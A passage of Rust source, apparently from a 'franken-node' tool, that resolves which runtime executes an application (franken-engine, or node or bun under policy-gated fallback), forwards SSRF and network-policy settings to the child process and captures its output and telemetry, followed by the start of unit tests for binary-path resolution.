use crate::ops::telemetry_bridge::{
    ShutdownReason, TelemetryBridge, TelemetryRuntimeHandle, TelemetryRuntimeReport,
};
use crate::runtime::lockstep_harness::LockstepHarness;
use crate::storage::frankensqlite_adapter::FrankensqliteAdapter;
use crate::{
    ActionableError,
    config::{Config, PreferredRuntime, Profile},
};
use anyhow::{Context, Result};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::ffi::OsString;
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Instant;

pub struct EngineDispatcher {
    engine_bin_path: String,
    configured_path: Option<PathBuf>,
    requested_runtime: PreferredRuntime,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapturedProcessOutput {
    pub stdout: String,
    pub stderr: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RunDispatchReport {
    pub runtime: String,
    pub runtime_path: String,
    pub target: String,
    pub working_dir: String,
    pub used_fallback_runtime: bool,
    pub started_at_utc: String,
    pub finished_at_utc: String,
    pub duration_ms: u64,
    pub exit_code: Option<i32>,
    pub terminated_by_signal: bool,
    pub telemetry: Option<TelemetryRuntimeReport>,
    pub captured_output: CapturedProcessOutput,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum DispatchPlan {
    FrankenEngine { binary: String },
    RuntimeFallback(RuntimeFallbackPlan),
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct RuntimeFallbackPlan {
    runtime: String,
    runtime_path: PathBuf,
    target: PathBuf,
    working_dir: PathBuf,
    mode: RuntimeExecutionMode,
}

struct DispatchResolutionInputs<'a> {
    configured_hint: &'a str,
    env_override: Option<&'a str>,
    cli_path: Option<&'a Path>,
    config_path: Option<&'a Path>,
    candidates: &'a [PathBuf],
}

struct DispatchReportInputs<'a> {
    runtime: &'a str,
    runtime_path: &'a Path,
    target: &'a Path,
    working_dir: &'a Path,
    used_fallback_runtime: bool,
    started_at: chrono::DateTime<Utc>,
    duration: std::time::Duration,
    output: Output,
    telemetry: Option<TelemetryRuntimeReport>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RuntimeExecutionMode {
    Explicit,
    FallbackFrankenEngineUnavailable,
}

#[derive(Debug)]
enum EngineProcessError {
    Spawn {
        message: String,
        #[cfg_attr(not(test), allow(dead_code))]
        telemetry_report: Option<Box<TelemetryRuntimeReport>>,
    },
    TelemetryDrain(String),
}

impl std::fmt::Display for EngineProcessError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Spawn { message, .. } | Self::TelemetryDrain(message) => f.write_str(message),
        }
    }
}

impl std::error::Error for EngineProcessError {}

#[derive(Debug)]
enum DispatchResolutionError {
    RequestedRuntimeUnavailable(ActionableError),
    Resolution(anyhow::Error),
}

impl std::fmt::Display for DispatchResolutionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::RequestedRuntimeUnavailable(error) => error.fmt(f),
            Self::Resolution(err) => err.fmt(f),
        }
    }
}

impl std::error::Error for DispatchResolutionError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::RequestedRuntimeUnavailable(error) => Some(error),
            Self::Resolution(err) => Some(err.as_ref()),
        }
    }
}

type DispatchResolutionResult<T> = std::result::Result<T, DispatchResolutionError>;

const NODE_INSTALL_URL: &str = "https://nodejs.org/en/download";
const BUN_INSTALL_URL: &str = "https://bun.sh/docs/installation";
const DEGRADED_FALLBACK_OPT_IN_ENV: &str = "FRANKEN_NODE_ALLOW_DEGRADED_RUNTIME_FALLBACK";

fn requested_runtime_unavailable_error(runtime: &str, app_path: &Path) -> ActionableError {
    ActionableError::new(
        format!(
            "requested runtime `{runtime}` was not found; install it, adjust PATH, or use `--runtime auto`"
        ),
        format!("franken-node run --runtime auto {}", app_path.display()),
    )
    .with_help_url(NODE_INSTALL_URL)
    .with_help_url(BUN_INSTALL_URL)
}

fn fallback_runtime_unavailable_error(app_path: &Path) -> ActionableError {
    ActionableError::new(
        "franken-engine was not found and no fallback runtime is available; install node or bun, or configure --engine-bin/FRANKEN_ENGINE_BIN/FRANKEN_NODE_ENGINE_BINARY_PATH",
        format!(
            "franken-node run --engine-bin /absolute/path/to/franken-engine {}",
            app_path.display()
        ),
    )
    .with_help_url(NODE_INSTALL_URL)
    .with_help_url(BUN_INSTALL_URL)
}

fn configured_engine_binary_missing_error(binary: &Path, app_path: &Path) -> ActionableError {
    ActionableError::new(
        format!(
            "configured franken-engine binary `{}` was not found; fix --engine-bin, FRANKEN_ENGINE_BIN, FRANKEN_NODE_ENGINE_BINARY_PATH, or [engine].binary_path",
            binary.display()
        ),
        format!(
            "franken-node run --engine-bin /absolute/path/to/franken-engine {}",
            app_path.display()
        ),
    )
}

fn trust_native_runtime_unavailable_error(app_path: &Path) -> ActionableError {
    ActionableError::new(
        "trust-native runtime unavailable: strict profile requires franken-engine; auto-mode will not fall back to node/bun with reduced enforcement",
        format!(
            "franken-node run --engine-bin /absolute/path/to/franken-engine {}",
            app_path.display()
        ),
    )
}

fn degraded_fallback_opt_in_required_error(app_path: &Path) -> ActionableError {
    ActionableError::new(
        format!(
            "trust-native runtime unavailable: auto-mode fallback to node/bun requires explicit reduced-guarantee opt-in via {DEGRADED_FALLBACK_OPT_IN_ENV}=1"
        ),
        format!(
            "{DEGRADED_FALLBACK_OPT_IN_ENV}=1 franken-node run {}",
            app_path.display()
        ),
    )
}

fn degraded_fallback_opt_in_enabled() -> bool {
    std::env::var(DEGRADED_FALLBACK_OPT_IN_ENV)
        .ok()
        .is_some_and(|value| {
            matches!(
                value.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
}

fn fallback_runtime_policy_error(
    profile: Profile,
    degraded_fallback_opt_in: bool,
    app_path: &Path,
) -> Option<ActionableError> {
    match profile {
        Profile::Strict => Some(trust_native_runtime_unavailable_error(app_path)),
        Profile::Balanced | Profile::LegacyRisky if !degraded_fallback_opt_in => {
            Some(degraded_fallback_opt_in_required_error(app_path))
        }
        Profile::Balanced | Profile::LegacyRisky => None,
    }
}

/// Returns the list of candidate paths to search for the franken-engine binary.
fn default_engine_binary_candidates() -> Vec<PathBuf> {
    let mut candidates = Vec::new();

    if let Ok(exe_path) = std::env::current_exe()
        && let Some(exe_dir) = exe_path.parent()
    {
        candidates.push(exe_dir.join("franken-engine"));
        candidates.push(exe_dir.join("franken-engine.exe"));
    }

    candidates.push(PathBuf::from("franken-engine"));
    candidates.push(PathBuf::from("franken-engine.exe"));
    candidates
}

fn has_path_separator(raw: &str) -> bool {
    raw.contains('/') || raw.contains('\\')
}

fn command_exists_with(
    command: &str,
    path_env: Option<OsString>,
    path_exists: &impl Fn(&Path) -> bool,
) -> bool {
    resolve_command_path_with(command, path_env.as_ref(), path_exists).is_some()
}

fn resolve_command_path_with(
    command: &str,
    path_env: Option<&OsString>,
    path_exists: &impl Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return None;
    }

    let path = Path::new(trimmed);
    if path.is_absolute() || has_path_separator(trimmed) {
        return path_exists(path).then(|| path.to_path_buf());
    }

    let Ok(cwd) = std::env::current_dir() else {
        return None;
    };
    match path_env {
        Some(path_env) => which::which_in(trimmed, Some(path_env), &cwd).ok(),
        None => which::which(trimmed).ok(),
    }
}

fn resolve_engine_binary_path_with(
    configured_hint: &str,
    env_override: Option<&str>,
    cli_path: Option<&Path>,
    config_path: Option<&Path>,
    candidates: &[PathBuf],
    path_exists: &impl Fn(&Path) -> bool,
) -> String {
    // 1. CLI --engine-bin flag -- highest precedence.
    if let Some(path) = cli_path {
        return path.to_string_lossy().into_owned();
    }

    // 2. FRANKEN_ENGINE_BIN environment variable.
    if let Some(raw) = env_override {
        let override_bin = raw.trim();
        if !override_bin.is_empty() {
            return override_bin.to_string();
        }
    }

    // 3. Config file / FRANKEN_NODE_ENGINE_BINARY_PATH -- config-level path.
    if let Some(path) = config_path {
        return path.to_string_lossy().into_owned();
    }

    // 4. Configured hint from default candidates (if file exists on disk).
    let configured = configured_hint.trim();
    if !configured.is_empty() && path_exists(Path::new(configured)) {
        return configured.to_string();
    }

    // 5. Search candidate locations.
    for candidate in candidates {
        if path_exists(candidate) {
            return candidate.to_string_lossy().into_owned();
        }
    }

    if !configured.is_empty() && !has_path_separator(configured) {
        return configured.to_string();
    }

    "franken-engine".to_string()
}

fn resolve_engine_binary_path_with_env_lookup(
    configured_hint: &str,
    env_lookup: &impl Fn(&str) -> Option<String>,
    candidates: &[PathBuf],
    path_exists: &impl Fn(&Path) -> bool,
) -> String {
    let env_override = env_lookup("FRANKEN_ENGINE_BIN");
    let config_path = env_lookup("FRANKEN_NODE_ENGINE_BINARY_PATH").map(PathBuf::from);
    resolve_engine_binary_path_with(
        configured_hint,
        env_override.as_deref(),
        None,
        config_path.as_deref(),
        candidates,
        path_exists,
    )
}

pub(crate) fn resolve_engine_binary_path(configured_hint: &str) -> String {
    resolve_engine_binary_path_with_env_lookup(
        configured_hint,
        &|key| std::env::var(key).ok(),
        &default_engine_binary_candidates(),
        &|path| path.exists(),
    )
}

fn project_root_for_path(app_path: &Path) -> &Path {
    if app_path.is_dir() {
        app_path
    } else {
        app_path
            .parent()
            .filter(|parent| !parent.as_os_str().is_empty())
            .unwrap_or_else(|| Path::new("."))
    }
}

fn project_prefers_bun(app_path: &Path) -> bool {
    if app_path
        .extension()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|ext| matches!(ext, "ts" | "tsx"))
    {
        return true;
    }

    let root = project_root_for_path(app_path);
    if root.join("bun.lock").is_file() || root.join("bun.lockb").is_file() {
        return true;
    }

    let package_json = root.join("package.json");
    let Ok(root_canonical) = root.canonicalize() else {
        return false;
    };
    let Ok(resolved) = package_json.canonicalize() else {
        return false;
    };
    if !resolved.starts_with(&root_canonical) {
        return false;
    }
    let Ok(contents) = std::fs::read_to_string(&resolved) else {
        return false;
    };
    let Ok(manifest) = serde_json::from_str::<serde_json::Value>(&contents) else {
        return false;
    };

    manifest
        .get("packageManager")
        .and_then(serde_json::Value::as_str)
        .is_some_and(|manager| manager.trim_start().starts_with("bun@"))
}

fn fallback_runtime_candidates(
    app_path: &Path,
    preferred_runtime: PreferredRuntime,
) -> [&'static str; 2] {
    match preferred_runtime {
        PreferredRuntime::Node => ["node", "bun"],
        PreferredRuntime::Bun => ["bun", "node"],
        _ if project_prefers_bun(app_path) => ["bun", "node"],
        _ => ["node", "bun"],
    }
}

fn resolve_requested_runtime_plan_with(
    requested_runtime: PreferredRuntime,
    app_path: &Path,
    path_env: Option<OsString>,
    path_exists: &impl Fn(&Path) -> bool,
) -> DispatchResolutionResult<RuntimeFallbackPlan> {
    let runtime = match requested_runtime {
        PreferredRuntime::Node => "node",
        PreferredRuntime::Bun => "bun",
        _ => unreachable!("only node and bun are supported requested runtimes here"),
    };

    let runtime_path = resolve_command_path_with(runtime, path_env.as_ref(), path_exists)
        .ok_or_else(|| {
            DispatchResolutionError::RequestedRuntimeUnavailable(
                requested_runtime_unavailable_error(runtime, app_path),
            )
        })?;

    let target = LockstepHarness::resolve_runtime_target(runtime, app_path)
        .map_err(DispatchResolutionError::Resolution)?;
    Ok(RuntimeFallbackPlan {
        runtime: runtime.to_string(),
        runtime_path,
        target,
        working_dir: project_root_for_path(app_path).to_path_buf(),
        mode: RuntimeExecutionMode::Explicit,
    })
}

fn resolve_fallback_runtime_plan_with(
    app_path: &Path,
    preferred_runtime: PreferredRuntime,
    path_env: Option<OsString>,
    path_exists: &impl Fn(&Path) -> bool,
) -> DispatchResolutionResult<RuntimeFallbackPlan> {
    for runtime in fallback_runtime_candidates(app_path, preferred_runtime) {
        let Some(runtime_path) = resolve_command_path_with(runtime, path_env.as_ref(), path_exists)
        else {
            continue;
        };

        let target = LockstepHarness::resolve_runtime_target(runtime, app_path)
            .map_err(DispatchResolutionError::Resolution)?;
        return Ok(RuntimeFallbackPlan {
            runtime: runtime.to_string(),
            runtime_path,
            target,
            working_dir: project_root_for_path(app_path).to_path_buf(),
            mode: RuntimeExecutionMode::FallbackFrankenEngineUnavailable,
        });
    }

    Err(DispatchResolutionError::RequestedRuntimeUnavailable(
        fallback_runtime_unavailable_error(app_path),
    ))
}

fn resolve_explicit_engine_plan_with(
    app_path: &Path,
    inputs: DispatchResolutionInputs<'_>,
    path_env: Option<OsString>,
    path_exists: &impl Fn(&Path) -> bool,
) -> DispatchResolutionResult<DispatchPlan> {
    let binary = resolve_engine_binary_path_with(
        inputs.configured_hint,
        inputs.env_override,
        inputs.cli_path,
        inputs.config_path,
        inputs.candidates,
        path_exists,
    );

    if !command_exists_with(&binary, path_env, path_exists) {
        return Err(DispatchResolutionError::RequestedRuntimeUnavailable(
            ActionableError::new(
                "requested runtime `franken-engine` was not found; fix --engine-bin, FRANKEN_ENGINE_BIN, FRANKEN_NODE_ENGINE_BINARY_PATH, or [engine].binary_path",
                format!("franken-node run --runtime auto {}", app_path.display()),
            )
            .with_help_url(NODE_INSTALL_URL)
            .with_help_url(BUN_INSTALL_URL),
        ));
    }

    Ok(DispatchPlan::FrankenEngine { binary })
}

fn resolve_dispatch_plan_with(
    app_path: &Path,
    requested_runtime: PreferredRuntime,
    inputs: DispatchResolutionInputs<'_>,
    path_env: Option<OsString>,
    path_exists: &impl Fn(&Path) -> bool,
) -> DispatchResolutionResult<DispatchPlan> {
    match requested_runtime {
        PreferredRuntime::Node | PreferredRuntime::Bun => {
            return resolve_requested_runtime_plan_with(
                requested_runtime,
                app_path,
                path_env,
                path_exists,
            )
            .map(DispatchPlan::RuntimeFallback);
        }
        PreferredRuntime::FrankenEngine => {
            return resolve_explicit_engine_plan_with(app_path, inputs, path_env, path_exists);
        }
        PreferredRuntime::Auto => {}
    }

    let binary = resolve_engine_binary_path_with(
        inputs.configured_hint,
        inputs.env_override,
        inputs.cli_path,
        inputs.config_path,
        inputs.candidates,
        path_exists,
    );

    if command_exists_with(&binary, path_env.clone(), path_exists) {
        return Ok(DispatchPlan::FrankenEngine { binary });
    }

    let explicit_override = inputs.cli_path.is_some()
        || inputs.config_path.is_some()
        || inputs
            .env_override
            .is_some_and(|value| !value.trim().is_empty());
    if explicit_override {
        return Err(DispatchResolutionError::RequestedRuntimeUnavailable(
            configured_engine_binary_missing_error(Path::new(&binary), app_path),
        ));
    }

    resolve_fallback_runtime_plan_with(app_path, PreferredRuntime::Auto, path_env, path_exists)
        .map(DispatchPlan::RuntimeFallback)
}

fn captured_output_from(output: Output) -> CapturedProcessOutput {
    CapturedProcessOutput {
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
    }
}

fn run_command_capture_output(cmd: &mut Command) -> io::Result<Output> {
    fn join_reader(
        handle: thread::JoinHandle<io::Result<Vec<u8>>>,
        label: &'static str,
    ) -> io::Result<Vec<u8>> {
        match handle.join() {
            Ok(Ok(buf)) => Ok(buf),
            Ok(Err(err)) => Err(err),
            Err(_) => Err(io::Error::other(format!("{label} reader thread panicked"))),
        }
    }

    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd.spawn()?;
    let mut stdout = child
        .stdout
        .take()
        .ok_or_else(|| io::Error::other("stdout pipe unavailable after spawn"))?;
    let mut stderr = child
        .stderr
        .take()
        .ok_or_else(|| io::Error::other("stderr pipe unavailable after spawn"))?;

    let stdout_thread = thread::spawn(move || {
        let mut buf = Vec::new();
        stdout.read_to_end(&mut buf)?;
        Ok(buf)
    });
    let stderr_thread = thread::spawn(move || {
        let mut buf = Vec::new();
        stderr.read_to_end(&mut buf)?;
        Ok(buf)
    });

    let status = match child.wait() {
        Ok(status) => status,
        Err(err) => {
            let _ = child.kill();
            let _ = child.wait();
            let _ = join_reader(stdout_thread, "stdout");
            let _ = join_reader(stderr_thread, "stderr");
            return Err(err);
        }
    };

    let stdout = join_reader(stdout_thread, "stdout")?;
    let stderr = join_reader(stderr_thread, "stderr")?;

    Ok(Output {
        status,
        stdout,
        stderr,
    })
}

impl Default for EngineDispatcher {
    fn default() -> Self {
        let default_hint = default_engine_binary_candidates()
            .first()
            .map(|path| path.to_string_lossy().into_owned())
            .unwrap_or_else(|| "franken-engine".to_string());
        Self {
            engine_bin_path: default_hint,
            configured_path: None,
            requested_runtime: PreferredRuntime::Auto,
        }
    }
}

impl EngineDispatcher {
    /// Create a dispatcher with optional engine-binary and runtime overrides.
    pub fn new(path: Option<PathBuf>, requested_runtime: PreferredRuntime) -> Self {
        Self {
            configured_path: path,
            requested_runtime,
            ..Self::default()
        }
    }

    /// Dispatches execution to the external franken_engine binary.
    /// Serializes policy capabilities and limits into environment variables
    /// or command-line arguments to establish the trust boundary.
    ///
    /// Telemetry lifecycle:
    /// 1. Start telemetry bridge (returns owned handle)
    /// 2. Launch engine process with socket path
    /// 3. Wait for engine to exit
    /// 4. Stop telemetry bridge with appropriate reason
    /// 5. Join telemetry workers (drain remaining events)
    /// 6. Clean up temp directory
    pub fn dispatch_run(
        &self,
        app_path: &Path,
        config: &Config,
        policy_mode: &str,
    ) -> Result<RunDispatchReport> {
        // Precedence: explicit runtime selection > CLI --engine-bin > FRANKEN_ENGINE_BIN env > config [engine].binary_path > candidates.
        let env_override = std::env::var("FRANKEN_ENGINE_BIN").ok();
        let config_path = config.engine.binary_path.as_deref();
        let started_at = Utc::now();
        let started = Instant::now();
        let dispatch_plan = match resolve_dispatch_plan_with(
            app_path,
            self.requested_runtime,
            DispatchResolutionInputs {
                configured_hint: &self.engine_bin_path,
                env_override: env_override.as_deref(),
                cli_path: self.configured_path.as_deref(),
                config_path,
                candidates: &default_engine_binary_candidates(),
            },
            std::env::var_os("PATH"),
            &|path| path.exists(),
        ) {
            Ok(plan) => plan,
            Err(DispatchResolutionError::RequestedRuntimeUnavailable(error)) => {
                eprintln!("{error}");
                std::process::exit(127);
            }
            Err(DispatchResolutionError::Resolution(err)) => return Err(err),
        };

        if let DispatchPlan::RuntimeFallback(plan) = dispatch_plan {
            if plan.mode == RuntimeExecutionMode::FallbackFrankenEngineUnavailable {
                if let Some(error) = fallback_runtime_policy_error(
                    config.profile,
                    degraded_fallback_opt_in_enabled(),
                    app_path,
                ) {
                    return Err(error.into());
                }
                tracing::warn!(
                    runtime = %plan.runtime,
                    runtime_path = %plan.runtime_path.display(),
                    target = %plan.target.display(),
                    "franken-engine unavailable; falling back to alternate runtime with reduced guarantees"
                );
                eprintln!(
                    "franken-engine unavailable; falling back to `{}` for {}. Reduced guarantees: no engine-native policy enforcement or telemetry bridge.",
                    plan.runtime,
                    app_path.display(),
                );
            }

            let mut command = Command::new(&plan.runtime_path);
            command
                .arg(&plan.target)
                .current_dir(&plan.working_dir)
                .env("FRANKEN_NODE_REQUESTED_POLICY_MODE", policy_mode);
            if plan.mode == RuntimeExecutionMode::FallbackFrankenEngineUnavailable {
                command
                    .env("FRANKEN_NODE_FALLBACK_RUNTIME", &plan.runtime)
                    .env("FRANKEN_NODE_FALLBACK_REASON", "franken_engine_unavailable");
            }

            // Wire network policy to fallback runtime (bd-3pogm).
            // Even fallback runtimes should receive policy hints for best-effort enforcement.
            let network_policy = &config.security.network_policy;

            // SSRF enforcement mode: none, monitor, or block (must mirror the engine path).
            let enforcement_mode = match network_policy.ssrf_enforcement {
                crate::config::SsrfEnforcementMode::None => "none",
                crate::config::SsrfEnforcementMode::Monitor => "monitor",
                crate::config::SsrfEnforcementMode::Block => "block",
            };
            command.env("FRANKEN_ENGINE_NETWORK_SSRF_ENFORCEMENT", enforcement_mode);

            command
                .env(
                    "FRANKEN_NODE_NETWORK_SSRF_PROTECTION_ENABLED",
                    if network_policy.ssrf_protection_enabled {
                        "1"
                    } else {
                        "0"
                    },
                )
                .env(
                    "FRANKEN_NODE_NETWORK_BLOCK_CLOUD_METADATA",
                    if network_policy.block_cloud_metadata {
                        "1"
                    } else {
                        "0"
                    },
                )
                .env(
                    "FRANKEN_NODE_NETWORK_AUDIT_BLOCKED",
                    if network_policy.audit_blocked_requests {
                        "1"
                    } else {
                        "0"
                    },
                );
            if !network_policy.allowlist.is_empty() {
                let allowlist_json = serde_json::to_string(&network_policy.allowlist)
                    .unwrap_or_else(|_| "[]".to_string());
                command.env("FRANKEN_NODE_NETWORK_ALLOWLIST", allowlist_json);
            }

            let output = run_command_capture_output(&mut command).with_context(|| {
                format!(
                    "failed launching runtime `{}` for {}",
                    plan.runtime,
                    plan.target.display()
                )
            })?;

            return Ok(Self::build_dispatch_report(DispatchReportInputs {
                runtime: &plan.runtime,
                runtime_path: &plan.runtime_path,
                target: &plan.target,
                working_dir: &plan.working_dir,
                used_fallback_runtime: plan.mode
                    == RuntimeExecutionMode::FallbackFrankenEngineUnavailable,
                started_at,
                duration: started.elapsed(),
                output,
                telemetry: None,
            }));
        }

        let DispatchPlan::FrankenEngine { binary: bin_path } = dispatch_plan else {
            unreachable!("runtime fallback returns early");
        };

        let serialized_config = config.to_toml()?;
        let temp_dir = tempfile::Builder::new()
            .prefix("franken_telemetry_")
            .tempdir()
            .context("Failed to create secure temporary directory for telemetry socket")?;
        let socket_path = temp_dir
            .path()
            .join("telemetry.sock")
            .to_string_lossy()
            .into_owned();

        // Start telemetry bridge and obtain explicit lifecycle handle
        let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
        let telemetry = TelemetryBridge::new(&socket_path, adapter);
        let telemetry_handle = telemetry
            .start()
            .context("Failed to start telemetry bridge")?;

        let mut cmd = Command::new(&bin_path);
        cmd.arg("run")
            .arg(app_path)
            .arg("--policy")
            .arg(policy_mode)
            .env("FRANKEN_ENGINE_POLICY_PAYLOAD", &serialized_config)
            .env(
                "FRANKEN_ENGINE_TELEMETRY_SOCKET",
                telemetry_handle.socket_path().to_string_lossy().as_ref(),
            );

        // Wire network policy enforcement to spawned engine process (bd-3pogm).
        // These env vars provide a fast path for the engine to read policy without
        // parsing the full TOML config payload.
        let network_policy = &config.security.network_policy;

        // SSRF enforcement mode: none, monitor, or block
        let enforcement_mode = match network_policy.ssrf_enforcement {
            crate::config::SsrfEnforcementMode::None => "none",
            crate::config::SsrfEnforcementMode::Monitor => "monitor",
            crate::config::SsrfEnforcementMode::Block => "block",
        };
        cmd.env("FRANKEN_ENGINE_NETWORK_SSRF_ENFORCEMENT", enforcement_mode);

        cmd.env(
            "FRANKEN_ENGINE_NETWORK_SSRF_PROTECTION_ENABLED",
            if network_policy.ssrf_protection_enabled {
                "1"
            } else {
                "0"
            },
        )
        .env(
            "FRANKEN_ENGINE_NETWORK_BLOCK_CLOUD_METADATA",
            if network_policy.block_cloud_metadata {
                "1"
            } else {
                "0"
            },
        )
        .env(
            "FRANKEN_ENGINE_NETWORK_AUDIT_BLOCKED",
            if network_policy.audit_blocked_requests {
                "1"
            } else {
                "0"
            },
        );

        // Serialize allowlist as JSON for structured parsing by the engine.
        if !network_policy.allowlist.is_empty() {
            let allowlist_json = serde_json::to_string(&network_policy.allowlist)
                .unwrap_or_else(|_| "[]".to_string());
            cmd.env("FRANKEN_ENGINE_NETWORK_ALLOWLIST", allowlist_json);
        }

        let (output, report) = Self::run_engine_process(&mut cmd, telemetry_handle)
            .map_err(|err| anyhow::anyhow!("{err}"))?;
        if !report.drain_completed {
            eprintln!(
                "Warning: telemetry drain did not complete within {}ms ({} events persisted, {} shed, {} dropped)",
                report.drain_duration_ms,
                report.persisted_total,
                report.shed_total,
                report.dropped_total,
            );
        }

        // Clean up temp directory explicitly before potential process exit
        drop(temp_dir);

        Ok(Self::build_dispatch_report(DispatchReportInputs {
            runtime: "franken_engine",
            runtime_path: Path::new(&bin_path),
            target: app_path,
            working_dir: project_root_for_path(app_path),
            used_fallback_runtime: false,
            started_at,
            duration: started.elapsed(),
            output,
            telemetry: Some(report),
        }))
    }

    fn build_dispatch_report(inputs: DispatchReportInputs<'_>) -> RunDispatchReport {
        let finished_at = Utc::now();
        let exit_code = inputs.output.status.code();
        let terminated_by_signal = exit_code.is_none();

        RunDispatchReport {
            runtime: inputs.runtime.to_string(),
            runtime_path: inputs.runtime_path.display().to_string(),
            target: inputs.target.display().to_string(),
            working_dir: inputs.working_dir.display().to_string(),
            used_fallback_runtime: inputs.used_fallback_runtime,
            started_at_utc: inputs.started_at.to_rfc3339(),
            finished_at_utc: finished_at.to_rfc3339(),
            duration_ms: u64::try_from(inputs.duration.as_millis()).unwrap_or(u64::MAX),
            exit_code,
            terminated_by_signal,
            telemetry: inputs.telemetry,
            captured_output: captured_output_from(inputs.output),
        }
    }

    fn run_engine_process(
        cmd: &mut Command,
        telemetry_handle: TelemetryRuntimeHandle,
    ) -> std::result::Result<(Output, TelemetryRuntimeReport), EngineProcessError> {
        match run_command_capture_output(cmd) {
            Ok(output) => {
                let report = telemetry_handle
                    .stop_and_join(ShutdownReason::EngineExit {
                        exit_code: output.status.code(),
                    })
                    .map_err(|err| {
                        EngineProcessError::TelemetryDrain(format!(
                            "telemetry drain failed after engine exit: {err}"
                        ))
                    })?;
                Ok((output, report))
            }
            Err(spawn_err) => match telemetry_handle.stop_and_join(ShutdownReason::Requested) {
                Ok(report) if report.drain_completed => Err(EngineProcessError::Spawn {
                    message: format!(
                        "Failed to spawn franken_engine process: {spawn_err}. telemetry bridge stopped after launch failure in {}ms",
                        report.drain_duration_ms
                    ),
                    telemetry_report: Some(Box::new(report)),
                }),
                Ok(report) => Err(EngineProcessError::Spawn {
                    message: format!(
                        "Failed to spawn franken_engine process: {spawn_err}. telemetry bridge drain timed out after launch failure in {}ms",
                        report.drain_duration_ms
                    ),
                    telemetry_report: Some(Box::new(report)),
                }),
                Err(cleanup_err) => Err(EngineProcessError::Spawn {
                    message: format!(
                        "Failed to spawn franken_engine process: {spawn_err}. additionally failed to stop telemetry bridge: {cleanup_err}"
                    ),
                    telemetry_report: None,
                }),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ops::telemetry_bridge::{BridgeLifecycleState, event_codes, reason_codes};
    use std::collections::BTreeSet;
    #[cfg(unix)]
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::process::ExitStatusExt;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    fn write_fake_executable(path: &Path) {
        std::fs::write(path, "#!/bin/sh\n").expect("write fake executable");
        #[cfg(unix)]
        {
            let mut permissions = std::fs::metadata(path).expect("metadata").permissions();
            permissions.set_mode(0o755);
            std::fs::set_permissions(path, permissions).expect("chmod fake executable");
        }
    }

    fn captured_output(status_raw: i32, stdout: &[u8], stderr: &[u8]) -> Output {
        Output {
            status: std::process::ExitStatus::from_raw(status_raw),
            stdout: stdout.to_vec(),
            stderr: stderr.to_vec(),
        }
    }

    #[test]
    fn resolver_prefers_env_override() {
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            Some("custom-franken-engine"),
            None,
            None,
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "custom-franken-engine");
    }

    #[test]
    fn resolver_uses_existing_configured_hint() {
        let hint = "/opt/tools/franken-engine";
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved =
            resolve_engine_binary_path_with(hint, None, None, None, &candidates, &|path| {
                path == Path::new(hint)
            });
        assert_eq!(resolved, hint);
    }

    #[test]
    fn resolver_uses_first_existing_candidate() {
        let existing = "/tmp/franken-engine-candidate";
        let candidates = vec![
            PathBuf::from("/tmp/missing-a"),
            PathBuf::from(existing),
            PathBuf::from("/tmp/missing-b"),
        ];
        let lookup = [existing]
            .into_iter()
            .map(std::string::ToString::to_string)
            .collect::<BTreeSet<_>>();
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            None,
            None,
            None,
            &candidates,
            &|path| lookup.contains(&path.to_string_lossy().to_string()),
        );
        assert_eq!(resolved, existing);
    }

    #[test]
    fn resolver_keeps_command_style_configured_hint() {
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "franken-engine",
            None,
            None,
            None,
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "franken-engine");
    }

    #[test]
    fn resolver_falls_back_to_default_command_for_missing_absolute_hint() {
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            None,
            None,
            None,
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "franken-engine");
    }

    #[test]
    fn resolver_cli_path_beats_env_override() {
        let cli = PathBuf::from("/cli/franken-engine");
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            Some("env-franken-engine"),
            Some(&cli),
            None,
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "/cli/franken-engine");
    }

    #[test]
    fn resolver_env_override_beats_config_path() {
        let config = PathBuf::from("/config/franken-engine");
        let candidates = vec![PathBuf::from("/missing/auto")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            Some("env-franken-engine"),
            None,
            Some(&config),
            &candidates,
            &|_| false,
        );
        assert_eq!(resolved, "env-franken-engine");
    }

    #[test]
    fn resolver_ignores_blank_env_override_before_config_path() {
        let config = PathBuf::from("/config/franken-engine");
        let candidates = vec![PathBuf::from("/candidate/franken-engine")];
        let resolved = resolve_engine_binary_path_with(
            "/missing/configured",
            Some(" \t\n"),
            None,
            Some(&config),
            &candidates,
            &|path| path == Path::new("/candidate/franken-engine"),
        );

        assert_eq!(resolved, "/config/franken-engine");
    }

    #[test]
    fn resolver_config_path_beats_candidates() {
        let config = PathBuf::from("/config/franken-engine");
